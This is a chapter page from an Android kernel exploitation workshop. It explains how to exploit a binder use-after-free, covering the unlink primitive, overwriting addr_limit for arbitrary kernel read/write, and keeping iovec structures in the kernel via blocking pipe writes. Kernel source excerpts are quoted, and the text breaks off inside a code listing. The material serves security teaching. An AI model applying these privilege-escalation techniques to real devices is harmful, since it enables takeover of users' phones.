
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Exploitation Â· Android Kernel Exploitation</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Ashfaq Ansari (@HackSysTeam)">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-atom-dark.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="exploitation.html" />
    
    
    <link rel="prev" href="root-cause-analysis.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="environment-setup.html">
            
                <a href="environment-setup.html">
            
                    
                    Environment Setup
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="environment-setup.html">
            
                <a href="environment-setup.html#hardware-requirements">
            
                    
                    Hardware Requirements
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="environment-setup.html">
            
                <a href="environment-setup.html#software-requirements">
            
                    
                    Software Requirements
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.2.1" data-path="environment-setup.html">
            
                <a href="environment-setup.html#gdb">
            
                    
                    GDB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.2" data-path="environment-setup.html">
            
                <a href="environment-setup.html#workshop-repository">
            
                    
                    Workshop Repository
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.3" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-studio">
            
                    
                    Android Studio
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.4" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-ndk">
            
                    
                    Android NDK
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.5" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-virtual-device">
            
                    
                    Android Virtual Device
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2.6" data-path="environment-setup.html">
            
                <a href="environment-setup.html#android-kernel-source-code">
            
                    
                    Android Kernel Source Code
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html">
            
                    
                    Linux Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#light-weight-process">
            
                    
                    Light Weight Process
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#process-credentials">
            
                    
                    Process Credentials
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#selinux">
            
                    
                    SELinux
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.3.1" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#selinux-enforcing">
            
                    
                    selinux_enforcing
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="linux-privilege-escalation.html">
            
                <a href="linux-privilege-escalation.html#seccomp">
            
                    
                    SecComp
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html">
            
                    
                    Vulnerability Discovery
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html#original-discovery">
            
                    
                    Original Discovery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html#rediscovery">
            
                    
                    Rediscovery
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="vulnerability-discovery.html">
            
                <a href="vulnerability-discovery.html#patch">
            
                    
                    Patch
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html">
            
                    
                    Vulnerability Trigger
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#reintroduction">
            
                    
                    Reintroduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#build-kernel-with-kasan">
            
                    
                    Build Kernel With KASan
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#boot-kernel">
            
                    
                    Boot Kernel
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#crash">
            
                    
                    Crash
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="vulnerability-trigger.html">
            
                <a href="vulnerability-trigger.html#kasan-symbolizer">
            
                    
                    KASan Symbolizer
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="scripted-privilege-escalation.html">
            
                <a href="scripted-privilege-escalation.html">
            
                    
                    Scripted Privilege Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="scripted-privilege-escalation.html">
            
                <a href="scripted-privilege-escalation.html#kernel-debugging">
            
                    
                    Kernel Debugging
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html">
            
                    
                    Root Cause Analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash">
            
                    
                    Revisiting Crash
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.1.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash-allocation">
            
                    
                    Allocation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash-free">
            
                    
                    Free
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.1.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#revisiting-crash-use">
            
                    
                    Use
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#visual-studio-code">
            
                    
                    Visual Studio Code
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#static-analysis">
            
                    
                    Static Analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.3.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-open">
            
                    
                    open
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-epoll-create">
            
                    
                    epoll_create
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-epoll-ctl">
            
                    
                    epoll_ctl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.4" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-ioctl">
            
                    
                    ioctl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.5" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#syscall-ep-remove">
            
                    
                    ep_remove
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.3.6" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#static-analysis-recap">
            
                    
                    Static Analysis Recap
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7.4" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#dynamic-analysis">
            
                    
                    Dynamic Analysis
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.7.4.1" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#hw-cpu-ncore">
            
                    
                    hw.cpu.ncore
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4.2" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#build-kernel-without-kasan">
            
                    
                    Build Kernel Without KASan
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.7.4.3" data-path="root-cause-analysis.html">
            
                <a href="root-cause-analysis.html#kernel-tracing">
            
                    
                    Kernel Tracing
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter active" data-level="1.8" data-path="exploitation.html">
            
                <a href="exploitation.html">
            
                    
                    Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="exploitation.html">
            
                <a href="exploitation.html#primitive">
            
                    
                    Primitive
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="exploitation.html">
            
                <a href="exploitation.html#corruption-target">
            
                    
                    Corruption Target
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="exploitation.html">
            
                <a href="exploitation.html#leaking-task-struct-pointer">
            
                    
                    Leaking task_struct*
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.4" data-path="exploitation.html">
            
                <a href="exploitation.html#clobber-addr-limit">
            
                    
                    Clobber addr_limit
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.5" data-path="exploitation.html">
            
                <a href="exploitation.html#exploit-in-action">
            
                    
                    Exploit In Action
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.9" data-path="gdb-macros.html">
            
                <a href="gdb-macros.html">
            
                    
                    GDB Macros
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.10" data-path="resources.html">
            
                <a href="resources.html">
            
                    
                    Resources
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Exploitation</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="exploitation">Exploitation</h1>
<p>In <strong><a href="root-cause-analysis.html">Root Cause Analysis</a></strong> section we understood the vulnerability and why it happened.</p>
<p>We know that there are <strong>two</strong> places where the use of <strong>dangling</strong> <code>binder_thread</code> structure chunk happens. </p>
<p>The <strong>first</strong> use happen when <code>remove_wait_qeue</code> function tries to acquire the <strong>spin lock</strong>. However, it is not so much interesting from the point of view of exploitation.</p>
<p>The <strong>second</strong> use happens in the internal function <code>__remove_wait_queue</code> where it tries to <strong>unlink</strong> the <strong>poll wait queue</strong>. This is very interesting from the point of view of exploitation as we get a primitive where we can write pointer to <code>binder_thread-&gt;wait.head</code> to <code>binder_thread-&gt;wait.head.next</code> and <code>binder_thread-&gt;wait.head.prev</code> on a <strong>dangling</strong> chunk.</p>
<p>Let&apos;s revisit the <code>struct binder_thread</code> which is defined in <code>workshop/android-4.14-dev/goldfish/drivers/android/binder.c</code>.</p>
<pre class="language-"><code class="lang-c"><span class="token keyword">struct</span> <span class="token class-name">binder_thread</span> <span class="token punctuation">{</span>
        <span class="token keyword">struct</span> <span class="token class-name">binder_proc</span> <span class="token operator">*</span>proc<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">rb_node</span> rb_node<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">list_head</span> waiting_thread_node<span class="token punctuation">;</span>
        <span class="token keyword">int</span> pid<span class="token punctuation">;</span>
        <span class="token keyword">int</span> looper<span class="token punctuation">;</span>              <span class="token comment">/* only modified by this thread */</span>
        bool looper_need_return<span class="token punctuation">;</span> <span class="token comment">/* can be written by other thread */</span>
        <span class="token keyword">struct</span> <span class="token class-name">binder_transaction</span> <span class="token operator">*</span>transaction_stack<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">list_head</span> todo<span class="token punctuation">;</span>
        bool process_todo<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">binder_error</span> return_error<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">binder_error</span> reply_error<span class="token punctuation">;</span>
        wait_queue_head_t wait<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">binder_stats</span> stats<span class="token punctuation">;</span>
        atomic_t tmp_ref<span class="token punctuation">;</span>
        bool is_dead<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>task<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>If you look closely, you will notice that pointer to <code>struct task_struct</code> is also a member of this <code>binder_thread</code> structure.</p>
<p>If somehow we can leak this, we will know where the <code>task_struct</code> of the current process is.</p>
<blockquote>
<p><strong>Note:</strong> Read more about <code>task_struct</code> structure and Linux <strong>privilege escalation</strong> in <strong><a href="linux-privilege-escalation.html">Linux Privilege Escalation</a></strong> section.</p>
</blockquote>
<p>Now, let&apos;s see how we can exploit this <strong>vulnerability</strong>. As the <strong>exploit mitigations</strong> are increasing day by day, it&apos;s very important to build better <strong>primitives</strong>.</p>
<h2 id="primitive">Primitive </h2>
<p><code>task_struct</code> structure has an important member <code>addr_limit</code> of type <code>mm_segment_t</code>. <code>addr_limit</code> stores the highest valid <strong>user space</strong> address.</p>
<p><code>addr_limit</code> is part of <code>struct thread_info</code> or <code>struct thread_struct</code> depending on the target <strong>architecture</strong>. As we are now dealing with <strong>x86_64</strong> bit system, <code>addr_limit</code> is defined in <code>struct thread_struct</code> and it&apos;s part of <code>task_struct</code> structure.</p>
<p>To understand more about <code>addr_limit</code>, let&apos;s see the prototype of <code>read</code> and <code>write</code> system call.</p>
<pre class="language-"><code class="lang-c">ssize_t <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span><span class="token punctuation">;</span>
ssize_t <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> size_t count<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p><code>read</code>, <code>write</code>, etc., system call can pass a pointer to <strong>user space</strong> address to system functions. This is where <code>addr_limit</code> comes into picture. These system functions use <code>access_ok</code> function to validate if the passed address is really a <strong>user space</strong> address and it&apos;s accessible.</p>
<p>As we are on <strong>x86_64</strong> bit system at the moment, let&apos;s open <code>workshop/android-4.14-dev/goldfish/arch/x86/include/asm/uaccess.h</code> and see how <code>access_ok</code> is defined.</p>
<pre class="language-"><code class="lang-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">access_ok</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> size<span class="token punctuation">)</span>                                     </span><span class="token punctuation">\</span>
<span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">{</span>                                                                      </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token function">WARN_ON_IN_IRQ</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                               </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token function">likely</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">__range_not_ok</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token function">user_addr_max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           </span><span class="token punctuation">\</span>
<span class="token expression"><span class="token punctuation">}</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">user_addr_max</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>thread<span class="token punctuation">.</span>addr_limit<span class="token punctuation">.</span>seg<span class="token punctuation">)</span></span></span>
</code></pre>
<p>As you can see <code>user_addr_max</code> uses <code>current-&gt;thread.addr_limit.seg</code> for validation. If we can clobber this <code>addr_limit</code> with <code>0xFFFFFFFFFFFFFFFF</code>, we will be able to read and write to any part of the <strong>kernel space</strong> memory.</p>
<blockquote>
<p><strong>Note:</strong> <strong>Vitaly Nikolenko (@vnik5287)</strong> pointed out that in <strong>arm64</strong> there is a check in <code>do_page_fault</code> function which will crash the process if the <code>addr_limit</code> is set to <code>0xFFFFFFFFFFFFFFFF</code>. I did all of my tests on <strong>x86_64</strong> system so did not notice that in the beginning.</p>
</blockquote>
<p>Let&apos;s open <code>workshop/android-4.14-dev/goldfish/arch/arm64/mm/fault.c</code> and investigate <code>do_page_fault</code> function.</p>
<pre class="language-"><code class="lang-c"><span class="token keyword">static</span> <span class="token keyword">int</span> __kprobes <span class="token function">do_page_fault</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> addr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> esr<span class="token punctuation">,</span>
                                   <span class="token keyword">struct</span> <span class="token class-name">pt_regs</span> <span class="token operator">*</span>regs<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>tsk<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">;</span>
        <span class="token keyword">int</span> fault<span class="token punctuation">,</span> sig<span class="token punctuation">,</span> code<span class="token punctuation">,</span> major <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> vm_flags <span class="token operator">=</span> VM_READ <span class="token operator">|</span> VM_WRITE<span class="token punctuation">;</span>
        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> mm_flags <span class="token operator">=</span> FAULT_FLAG_ALLOW_RETRY <span class="token operator">|</span> FAULT_FLAG_KILLABLE<span class="token punctuation">;</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_ttbr0_addr</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_permission_fault</span><span class="token punctuation">(</span>esr<span class="token punctuation">,</span> regs<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">/* regs-&gt;orig_addr_limit may be 0 if we entered from EL0 */</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>regs<span class="token operator">-&gt;</span>orig_addr_limit <span class="token operator">==</span> KERNEL_DS<span class="token punctuation">)</span>
                        <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">&quot;Accessing user space memory with fs=KERNEL_DS&quot;</span><span class="token punctuation">,</span> regs<span class="token punctuation">,</span> esr<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul>
<li>checks if <code>orig_addr_limit == KERNEL_DS</code> then it will crash, basically <code>KERNEL_DS = 0xFFFFFFFFFFFFFFFF</code></li>
</ul>
<p>For the better <strong>compatibility</strong> of the exploit on <strong>x86_64</strong> and <strong>arm64</strong>, it&apos;s better to set <code>addr_limit</code> to <code>0xFFFFFFFFFFFFFFFE</code>.</p>
<p>Using this vulnerability, we would like to corrupt <code>addr_limit</code> to upgrade our simple primitive to more powerful primitive called <strong>Arbitrary Read Write</strong> primitive. </p>
<p><strong>Arbitrary Read Write</strong> primitives are also called as <strong>data only</strong> attacks. Where we do not hijack the <strong>execution flow</strong> of the <strong>CPU</strong> and just corrupt targeted data structures to achieve <strong>privilege escalation</strong>. </p>
<h2 id="corruption-target">Corruption Target </h2>
<p>We are going to use <code>struct iovec</code> as the corruption target as used by <strong>Maddie Stone</strong> and <strong>Jann Horn</strong> of <strong>Project Zero</strong>. The use of <code>struct iovec</code> was first published by <strong>Di Shen</strong> of <strong>KeenLab</strong>.</p>
<p><code>struct iovec</code> is used for <strong><a href="https://en.wikipedia.org/wiki/Vectored_I/O" target="_blank">Vectored I/O</a></strong> also know as <strong><a href="https://www.gnu.org/software/libc/manual/html_node/Scatter_002dGather.html" target="_blank">Scatter/Gather I/O</a></strong>.</p>
<p><strong>Vectored I/O</strong> is used to <strong>read</strong> data to a single buffer from multiple buffers and <strong>write</strong> data from single buffer to multiple buffers. This is used to reduce the overhead associated with multiple system calls if we want to read and write to multiple buffers using <code>read</code> or <code>write</code> system call.</p>
<p>In Linux, <strong>Vectored I/O</strong> is achieved using <code>iovec</code> structure and system calls like <code>readv</code>, <code>writev</code>, <code>recvmsg</code>, <code>sendmsg</code>, etc.</p>
<p>Let&apos;s see how <code>struct iovec</code> is defined in <code>workshop/android-4.14-dev/goldfish/include/uapi/linux/uio.h</code>.</p>
<pre class="language-"><code class="lang-c"><span class="token keyword">struct</span> <span class="token class-name">iovec</span>
<span class="token punctuation">{</span>
    <span class="token keyword">void</span> __user <span class="token operator">*</span>iov_base<span class="token punctuation">;</span>    <span class="token comment">/* BSD uses caddr_t (1003.1g requires void *) */</span>
    __kernel_size_t iov_len<span class="token punctuation">;</span> <span class="token comment">/* Must be size_t (1003.1g) */</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>To better understand <strong>Vectored I/O</strong>, and how <code>iovec</code> works let&apos;s see the below given diagram.</p>
<p align="center">
  <img src="../images/vectored-io-working.png" alt="Vectored I/O Working" title="Vectored I/O Working">
</p>

<p>Advantages of <code>struct iovec</code></p>
<ul>
<li>small in size, on <strong>x64 bit</strong> system it&apos;s size is <strong>0x10</strong> bytes</li>
<li>we can control all the members <code>iov_base</code> and <code>iov_len</code></li>
<li>we can stack them together to control desired <strong>kmalloc cache</strong></li>
<li>it has a pointer to <strong>buffer</strong> and <strong>length</strong> of the buffer, which is a great target for corruption</li>
</ul>
<p>One of the main <strong>issue</strong> with <code>struct iovec</code> is that they are <strong>short lived</strong>. They are allocated by system calls when they are working with the buffers and immediately freed when they return to user mode.</p>
<p>We want the <code>iovec</code> structure to stay in kernel when we trigger the <strong>unlink</strong> operation and overwrite the <code>iov_base</code> pointer with the address of <code>binder_thread-&gt;wait.head</code> to gain scoped read and write.</p>
<blockquote>
<p><strong>Note:</strong> We are on <strong>Android 4.14</strong> kernel, however, <strong>Project Zero</strong> guys wrote the exploit for <strong>Android 4.4</strong> kernel which does not have additional <code>access_ok</code> checks in <code>lib/iov_iter.c</code>. So, we had already applied the patch to revert those additional <strong>checks</strong> which would prevents us from leaking <strong>kernel space</strong> memory chunk.</p>
</blockquote>
<p><strong>How do we make <code>iovec</code> structure stay in kernel before we trigger the unlink operation?</strong></p>
<p>One way is to use system calls like <code>readv</code>, <code>writev</code> on a <code>pipe</code> file descriptor because it can <strong>block</strong> if the <code>pipe</code> is <strong>full</strong> or <strong>empty</strong>.</p>
<p><code>pipe</code> is an <strong>unidirectional</strong> data channel that can be used for interprocess communication. The blocking feature of <code>pipe</code> gives us significant time window to corrupt <code>iovec</code> structure in <strong>kernel space</strong>.</p>
<p>In the same manner we can use <code>recvmsg</code> system call to <strong>block</strong> by passing <code>MSG_WAITALL</code> as the flag parameter.</p>
<p>Let&apos;s dig into <code>writev</code> system call and figure out how it uses <code>iovec</code> structure. Let&apos;s open <code>workshop/android-4.14-dev/goldfish/fs/read_write.c</code> and look into the implementation.</p>
<pre class="language-"><code class="lang-c"><span class="token function">SYSCALL_DEFINE3</span><span class="token punctuation">(</span>writev<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> __user <span class="token operator">*</span><span class="token punctuation">,</span> vec<span class="token punctuation">,</span>
                <span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">,</span> vlen<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">do_writev</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> vec<span class="token punctuation">,</span> vlen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> ssize_t <span class="token function">do_writev</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> fd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> __user <span class="token operator">*</span>vec<span class="token punctuation">,</span>
                         <span class="token keyword">unsigned</span> <span class="token keyword">long</span> vlen<span class="token punctuation">,</span> rwf_t flags<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        <span class="token keyword">struct</span> <span class="token class-name">fd</span> f <span class="token operator">=</span> <span class="token function">fdget_pos</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        ssize_t ret <span class="token operator">=</span> <span class="token operator">-</span>EBADF<span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
                ret <span class="token operator">=</span> <span class="token function">vfs_writev</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>file<span class="token punctuation">,</span> vec<span class="token punctuation">,</span> vlen<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pos<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">static</span> ssize_t <span class="token function">vfs_writev</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">iovec</span> __user <span class="token operator">*</span>vec<span class="token punctuation">,</span>
                   <span class="token keyword">unsigned</span> <span class="token keyword">long</span> vlen<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>pos<span class="token punctuation">,</span> rwf_t flags<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
